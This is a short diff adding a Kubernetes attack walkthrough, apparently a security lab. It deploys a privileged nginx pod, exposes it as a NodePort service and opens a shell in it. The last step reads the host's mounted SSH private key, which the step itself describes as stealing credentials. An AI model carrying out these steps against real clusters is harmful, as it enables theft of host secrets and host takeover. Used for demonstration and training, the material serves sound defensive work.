@@ -1,0 +1,35 @@
+name: step01
+  description: deploy privilged nginx
+  command: kubectl apply -f nginx-deployment.yaml
+
+name: step02
+  description: get deployments
+  command: kubectl get deployments
+
+name: step03
+  description: expose the nginx to the node
+  command: kubectl expose deployment nginx-deployment --type=NodePort --name=nginx-service
+
+name: step04
+  description: get the exposed service with port
+  command: kubectl get service nginx-service
+
+name: step05
+  description: get the node name
+  command: kubectl get node
+
+name: step06
+  description: get the node address
+  command: kubectl describe node <NODE_NAME> | grep -C 1 Address
+
+name: step07
+  description: test nginx http access
+  command: curl http://<IP>:<PORT>
+
+name: step08
+  description: shell access to the nginx container
+  command: kubectl exec -it nginx-deployment-<POD_ID> bash
+
+name: step09
+  description: Find Host mount and find credentials, e.g. Steal SSH RSA Key (can be leveraged to access any secret in the host filesystem)
+  command: cat etc/ssh/ssh_host_rsa_key
